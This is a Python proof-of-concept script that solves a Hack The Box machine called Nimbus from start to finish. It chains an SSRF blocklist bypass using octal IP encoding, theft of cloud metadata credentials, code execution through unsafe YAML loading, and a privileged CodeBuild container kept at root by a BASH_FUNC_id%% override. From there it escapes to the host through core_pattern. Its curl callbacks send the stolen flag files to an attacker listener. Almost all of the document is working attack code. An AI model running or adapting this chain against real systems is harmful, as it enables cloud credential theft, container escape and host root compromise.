#!/usr/bin/env python3
"""
HTB Nimbus — Full Chain PoC  (user.txt + root.txt)

Exploit chain:
  1. SSRF on /jobs/preview bypass IMDS blocklist via octal IP encoding
  2. Fetch nimbus-web-role temp creds from IMDS
  3. Use creds to send malicious YAML job to SQS nimbus-jobs queue
  4. Worker executes yaml.load (unsafe) → python3 -c <script>
  5. Worker script creates CodeBuild project on LocalStack (floci:4566)
     image=floci/floci:latest, privilegedMode=true
  6. Start build with BASH_FUNC_id%%  to bypass entrypoint UID-drop
     → container runs as real UID 0 with near-full capabilities
  7. Build commands do overlay2 → core_pattern kernel usermode-helper escape:
     a. Find containerd snapshot path (host path to container writes)
     b. Write /exploit_root.sh inside container (appears on host at that path)
     c. echo "|<host-path>/exploit_root.sh" > /proc/sys/kernel/core_pattern
     d. bash -c 'kill -11 $$'  triggers kernel to exec our script as host root
     e. Script writes /root/root.txt → <udir>/rootflag.txt (readable in container)
  8. Build curls root.txt back to our HTTP listener

Usage:
  python3 Nimbus.py <LHOST> [--target <TARGET_IP>] [--port <PORT>]

Requirements:
  /etc/hosts:  10.129.x.x  nimbus.htb  aws.nimbus.htb
  pip install  boto3 pyyaml
"""

import argparse
import base64
import json
import os
import re
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

# ─── defaults ────────────────────────────────────────────────────────────────

DEFAULT_TARGET   = "10."
DEFAULT_VHOST    = "nimbus.htb"          # nginx canonical vhost (must match /etc/hosts)
DEFAULT_CB_PORT  = 9222
CALLBACK_TIMEOUT = 90   # seconds to wait for root.txt

SQS_ENDPOINT     = "http://aws.nimbus.htb"
QUEUE_URL        = "http://aws.nimbus.htb/847219365028/nimbus-jobs"
IMDS_URL         = (
    "http://0251.0376.0251.0376"        # 169.254.169.254 in octal, bypasses blocklist
    "/latest/meta-data/iam/security-credentials/nimbus-web-role"
    "?a=test.yaml"                      # .yaml suffix so the SSRF filter accepts it
)

# ─── shared state ─────────────────────────────────────────────────────────────

_user_flag = None
_root_flag = None
_flag_event = threading.Event()


# ─── HTTP listener ────────────────────────────────────────────────────────────

class _Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        global _user_flag, _root_flag
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode(errors="replace")
        params = dict(urllib.parse.parse_qsl(body))

        if self.path == "/user":
            try:
                _user_flag = base64.b64decode(params.get("flag", "")).decode().strip()
            except Exception:
                _user_flag = params.get("flag", "")
            print(f"\n[+] user.txt = {_user_flag}")

        elif self.path == "/root":
            try:
                _root_flag = base64.b64decode(params.get("flag", "")).decode().strip()
            except Exception:
                _root_flag = params.get("flag", "")
            print(f"\n[+] root.txt = {_root_flag}")
            _flag_event.set()

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *_): pass


def start_listener(port: int) -> HTTPServer:
    srv = HTTPServer(("0.0.0.0", port), _Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


# ─── SSRF → IMDS ─────────────────────────────────────────────────────────────

def ssrf_fetch(vhost: str, url: str) -> str:
    """POST to /jobs/preview using the vhost (not raw IP — nginx redirects raw IP to hostname)."""
    import html as _html
    data = urllib.parse.urlencode({"url": url}).encode()
    req  = urllib.request.Request(f"http://{vhost}/jobs/preview", data=data)
    resp = urllib.request.urlopen(req, timeout=20).read().decode(errors="replace")
    m = re.search(r"Raw response</h3><pre>(.*?)</pre>", resp, re.DOTALL)
    if m:
        return _html.unescape(m.group(1)).strip()
    return ""


def get_imds_creds(vhost: str) -> dict:
    print("[1] SSRF → IMDS  (octal IP bypass: 0251.0376.0251.0376 = 169.254.169.254)")
    raw = ssrf_fetch(vhost, IMDS_URL)
    if not raw:
        print("[-] SSRF returned empty response — is nimbus.htb reachable?")
        sys.exit(1)
    creds = json.loads(raw)
    print(f"    AccessKeyId : {creds['AccessKeyId']}")
    print(f"    Expiration  : {creds['Expiration']}")
    return creds


# ─── SQS → worker RCE ────────────────────────────────────────────────────────

def send_sqs_job(creds: dict, python_code: str):
    """Wrap python_code in base64, embed in unsafe YAML, send to SQS queue."""
    import subprocess, yaml

    b64  = base64.b64encode(python_code.encode()).decode()
    body = yaml.dump({
        "name":   "privesc",
        "script": f"import base64;exec(base64.b64decode('{b64}').decode())",
    })

    env = os.environ.copy()
    env["AWS_ACCESS_KEY_ID"]     = creds["AccessKeyId"]
    env["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
    env["AWS_SESSION_TOKEN"]     = creds.get("Token", "")
    env["AWS_DEFAULT_REGION"]    = "us-east-1"

    with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as f:
        f.write(body)
        tmp = f.name

    r = subprocess.run(
        ["aws", "--endpoint-url", SQS_ENDPOINT,
         "sqs", "send-message",
         "--queue-url", QUEUE_URL,
         "--message-body", f"file://{tmp}"],
        capture_output=True, text=True, env=env,
    )
    os.unlink(tmp)

    if r.returncode != 0:
        print(f"[-] SQS send failed:\n{r.stderr.strip()}")
        sys.exit(1)

    msg_id = json.loads(r.stdout).get("MessageId", "?")
    print(f"    MessageId   : {msg_id}")


# ─── CodeBuild escape payload ─────────────────────────────────────────────────

def make_worker_payload(kali_ip: str, cb_port: int) -> str:
    """
    Python code executed inside the worker container.
    Creates the CodeBuild project on LocalStack and starts a build that:
      - stays root via BASH_FUNC_id%% bypass
      - escapes to host via overlay2 upper-dir + core_pattern usermode-helper
      - curls user.txt and root.txt to our listener
    """

    buildspec = r"""version: 0.2
phases:
  build:
    commands:
      - id || true
      - cat /proc/self/status | grep -E '^(Uid|CapEff)' || true
      - UFLAG="" || true
      - test -f /root/user.txt && UFLAG=$(cat /root/user.txt 2>/dev/null | base64 -w0) || true
      - test -z "$UFLAG" && test -f /home/*/user.txt && UFLAG=$(cat /home/*/user.txt 2>/dev/null | base64 -w0) || true
      - test -z "$UFLAG" && test -f ./user.txt && UFLAG=$(cat ./user.txt 2>/dev/null | base64 -w0) || true
      - test -z "$UFLAG" && UFLAG=$(find / -maxdepth 5 -name "user.txt" 2>/dev/null | head -1 | xargs cat 2>/dev/null | base64 -w0) || true
      - test -z "$UFLAG" && UFLAG="NOTFOUND" || true
      - curl -sf -X POST http://KALI_PH:PORT_PH/user -d "flag=$UFLAG" --max-time 8 || true
      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1) || true
      - printf '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt\nchmod 777 %s/rootflag.txt\n' "$UDIR" "$UDIR" > /exploit_root.sh || true
      - chmod +x /exploit_root.sh || true
      - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern || true
      - ulimit -c unlimited || true
      - bash -c 'kill -11 $$' || true
      - sleep 4 || true
      - curl -sf -X POST http://KALI_PH:PORT_PH/root -d "flag=$(cat /rootflag.txt 2>/dev/null | base64 -w0 || echo NOTFOUND)" --max-time 10 || true
""".replace("KALI_PH", kali_ip).replace("PORT_PH", str(cb_port))

    code = f"""
import subprocess
import base64
import urllib.request
import os

# Worker RCE bosqichida user.txt olish (oldin)
try:
    result = subprocess.run(['find', '/', '-maxdepth', '5', '-name', 'user.txt'], 
                          capture_output=True, timeout=10, text=True)
    uflag_path = result.stdout.strip().split('\\n')[0] if result.stdout.strip() else None
    if uflag_path and os.path.isfile(uflag_path):
        with open(uflag_path, 'rb') as f:
            uflag_b64 = base64.b64encode(f.read()).decode()
        try:
            urllib.request.urlopen(
                f'http://{kali_ip}:{cb_port}/user',
                data=('flag=' + uflag_b64).encode(),
                timeout=5
            )
        except:
            pass
except Exception as e:
    pass

# CodeBuild escape
import boto3

FLOCI   = 'http://floci:4566'
PROJECT = 'nimbus-poc'

cb = boto3.client(
    'codebuild',
    region_name='us-east-1',
    endpoint_url=FLOCI,
    aws_access_key_id='test',
    aws_secret_access_key='test',
)
# Create project (ignore if already exists)
try:
    cb.create_project(
        name=PROJECT,
        source={{'type': 'NO_SOURCE'}},
        artifacts={{'type': 'NO_ARTIFACTS'}},
        environment={{
            'type': 'LINUX_CONTAINER',
            'computeType': 'BUILD_GENERAL1_SMALL',
            'image': 'floci/floci:latest',  # custom image with UID-drop entrypoint
            'privilegedMode': True,          # gives ~all Linux capabilities
        }},
        serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
    )
except Exception:
    pass  # project already exists

buildspec = {repr(buildspec)}
cb.start_build(
    projectName=PROJECT,
    # BASH_FUNC_id%%: overrides bash's 'id' command to return uid=1000,
    # fooling the entrypoint's UID-drop check so we stay as real UID 0.
    environmentVariablesOverride=[
        {{'name': 'BASH_FUNC_id%%', 'value': '() {{ echo uid=1000; }}', 'type': 'PLAINTEXT'}}
    ],
    buildspecOverride=buildspec,
)
"""
    return code


# ─── main ─────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="HTB Nimbus — user.txt + root.txt PoC")
    ap.add_argument("lhost",           help="Attacker IP (reachable from target)")
    ap.add_argument("--target", "-t",  default=DEFAULT_TARGET,
                    help=f"Target IP (default: {DEFAULT_TARGET})")
    ap.add_argument("--vhost",         default=DEFAULT_VHOST,
                    help=f"Target vhost for HTTP (default: {DEFAULT_VHOST})")
    ap.add_argument("--port",   "-p",  type=int, default=DEFAULT_CB_PORT,
                    help=f"Callback listener port (default: {DEFAULT_CB_PORT})")
    args = ap.parse_args()

    print("=" * 60)
    print("  HTB Nimbus — Full Chain PoC")
    print("=" * 60)
    print(f"  Target  : {args.target}  ({args.vhost})")
    print(f"  LHOST   : {args.lhost}:{args.port}")
    print()

    # Step 1: start callback listener
    srv = start_listener(args.port)
    print(f"[*] Callback listener up on :{args.port}")
    print()

    # Step 2: SSRF → IMDS creds
    creds = get_imds_creds(args.vhost)
    print()

    # Step 3: Build the worker payload
    print("[2] Building CodeBuild escape payload ...")
    payload = make_worker_payload(args.lhost, args.port)
    print()

    # Step 4: SQS → worker → CodeBuild chain
    print("[3] SQS → worker (yaml.load RCE → CodeBuild privileged escape)")
    send_sqs_job(creds, payload)
    print()

    # Step 5: Wait
    print(f"[*] Waiting up to {CALLBACK_TIMEOUT}s for root callback ...")
    print(f"    Chain: worker receives job → creates CodeBuild build →")
    print(f"    privileged container (UID 0, CapEff=0x1ffffffffff) →")
    print(f"    core_pattern usermode-helper on host kernel → /root/root.txt")
    print()

    got_it = _flag_event.wait(timeout=CALLBACK_TIMEOUT)
    print()

    if got_it:
        print("=" * 60)
        if _user_flag:
            print(f"  user.txt : {_user_flag}")
        if _root_flag:
            print(f"  root.txt : {_root_flag}")
        print("=" * 60)
    else:
        print("[-] Timed out — no callback received.")
        print("    Check: is LHOST reachable from the target?")
        print("    Check: is the worker container processing jobs?")
        sys.exit(1)

    srv.shutdown()


if __name__ == "__main__":
    main()
